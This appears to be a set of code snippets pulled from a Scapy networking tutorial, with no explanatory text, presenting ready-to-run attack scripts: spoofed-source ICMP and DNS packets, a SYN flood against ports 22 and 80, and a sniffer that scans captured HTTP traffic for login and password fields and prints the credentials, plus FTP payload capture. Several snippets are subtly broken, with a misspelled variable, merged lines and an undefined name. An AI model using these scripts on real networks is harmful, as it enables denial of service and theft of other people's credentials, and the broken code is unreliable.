["```py\nfrom scapy.all import *  \n```", "```py\niface = \"en0\"\nfake_ip = '192.168.1.3'\ndestination_ip = '192.168.1.5'  \n```", "```py\ndef ping(source, destination, iface):\n    pkt = IP(src=source,dst=destination)/ICMP()\n    srloop(IP(src=source,dst=destination)/ICMP(), iface=iface)  \n```", "```py\ntry:\n    print (\"Starting Ping\")\n    ping(fake_ip,destination_ip,iface)    \nexcept KeyboardInterrupt:\n    print(\"Exiting.. \")\n    sys.exit(0)  \n```", "```py\nsudo python3 ip-spoof-ping.py  \n```", "```py\ndef dnsQuery(source, destination, iface):\n    pkt =IP(dst=destination,src=source)/UDP()/DNS(rd=1,qd=DNSQR(qname=\"example.com\"))     sr1(pkt)  \n```", "```py\ntry: \n    print (\"Starting Ping\")\n    dnsQuery(fake_ip,dns_destination,iface)\nexcept KeyboardInterrupt:\n    print(\"Exiting.. \")\n    sys.exit(0)  \n```", "```py\nfrom scapy.all import *  \n```", "```py\niface = \"en0\"\ndestination_ip = '192.168.1.5'  \n```", "```py\ndef synFlood(destination, iface):\n    print (\"Starting SYN Flood\")       packet=IP(dst=destination,id=1111,ttl=99)/TCP(sport=RandShort(),dport=[22,80],seq=12345,ack=1000,window=1000,flags=\"S\")/\"HaX0r SVP\"\n    ans,unans=srloop(paket, iface=iface, inter=0.3,retry=2,timeout=4)\n    ans.summary()\n    unans.summary()  \n```", "```py\ntry:\n    synFlood(destination_ip, iface)\nexcept KeyboardInterrupt:\n    print(\"Exiting.. \")\n    sys.exit(0)  \n```", "```py\nsudo python3 syn-flooding.py  \n```", "```py\nfrom scapy.all import *\nfrom urllib import parse  \n```", "```py\niface = \"en0\"\nconf.verb=0  \n```", "```py\ndef get_login_pass(body):    \n    user = None\n    passwd = None    \n    userfields = ['log','login', 'wpname', 'ahd_username', \n'unickname', 'nickname', 'user', 'user_name',\n    'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',\n    'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',\n    'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',\n    'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']\n    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', \n    'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password'\n    'passwort', 'passwrd', 'wppassword', 'upasswd','senha','contrasena']    \n     for login in userfields:\n          login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)\n          if login_re:\n              user = login_re.group()\n      for passfield in passfields:\n          pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)\n         if pass_re:\n             passwd = pass_re.group()    \n     if user and passwd:\n         return (user, passwd)  \n```", "```py\ndef pkt_parser(pkt):    \n    if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):\n           pass       \n      if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):\n          pkt[TCP].payload\n          mail_packet = str(pkt[TCP].payload)    \n          body = str(pkt[TCP].payload)\n          user_passwd = get_login_pass(body)\n          if user_passwd != None:\n              print(parse.unquote(user_passwd[0]).encode(\"utf8\"))\n              print(parse.unquote( user_passwd[1]).encode(\"utf8\"))\n      else:\n          pass  \n```", "```py\ntry:\n    sniff(iface=iface, prn=pkt_parser, store=0)\nexcept KeyboardInterrupt:\n    print(\"Exiting.. \")\n    sys.exit(0)  \n```", "```py\nsudo python3 pass-sniffer.py  \n```", "```py\nif pkt[TCP].dport == 21 or pkt[TCP].sport ==21:\n   data = pkt[Raw].load\n   print(str(data))  \n```"]